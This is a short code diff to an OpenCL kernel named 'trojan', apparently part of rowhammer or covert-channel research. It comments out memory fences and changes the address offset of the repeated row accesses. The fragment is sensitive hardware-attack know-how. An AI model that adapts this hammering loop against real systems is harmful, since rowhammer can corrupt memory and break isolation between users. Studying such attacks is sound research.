@@ -59,17 +59,17 @@ __kernel void trojan(	global volatile unsigned short * restrict timings, //timin
 	volatile int start,stop;
 		
 		//rowhammer: turned off access through ACP
-		mem_fence(CLK_GLOBAL_MEM_FENCE);
+		//mem_fence(CLK_GLOBAL_MEM_FENCE);
 		#pragma unroll 1
 		for(i=0;i<inner_iter;i++) {
 			//readvalue=readvalue+test[adr]; //int is 4 bytes
 			//mem_fence(CLK_GLOBAL_MEM_FENCE);
 			//readvalue=readvalue+test[adr-0x200]; //need to open another row in the same bank 
 			//				     //(0x200 = 0x800/4) 0x800 2 rows back, div by 4 for integer
-			if(test[adr-0x1000]!=0xABCDEF12) readvalue=readvalue+test[adr];
-			mem_fence(CLK_GLOBAL_MEM_FENCE);
+			if(test[adr-0x2000]!=0xABCDEF12) readvalue=readvalue+test[adr];
+			//mem_fence(CLK_GLOBAL_MEM_FENCE);
 		}
-		mem_fence(CLK_GLOBAL_MEM_FENCE);
+		//mem_fence(CLK_GLOBAL_MEM_FENCE);
 		
 	}
 	test[3]=readvalue;
